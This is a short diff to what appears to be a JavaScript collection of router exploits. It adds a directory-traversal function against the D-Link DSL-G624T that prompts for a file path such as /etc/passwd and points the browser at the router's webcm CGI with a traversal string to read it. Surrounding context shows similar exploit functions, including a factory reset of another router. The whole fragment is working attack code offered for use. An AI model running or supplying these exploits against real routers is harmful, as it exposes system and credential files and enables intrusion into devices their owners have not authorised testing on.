@@ -177,6 +177,14 @@ function dir514_pathequivalence(ip)
 	document.location = "http://" + ip + "/uir/" + path;
 }
 
+// D-Link DSL-G624T - Directory Traversal
+function dslg624t_dirtraversal(ip)
+{
+	ip = ip || "192.168.1.1";
+	path = prompt("Path: (ex: /etc/passwd)");
+	document.location = "http://" + ip + "/cgi-bin/webcm?getpage=/././././././." + path;
+}
+
 // Unicorn Router WB-3300NR - Factory Reset
 function wb3300nr_factoryreset(ip)
 {
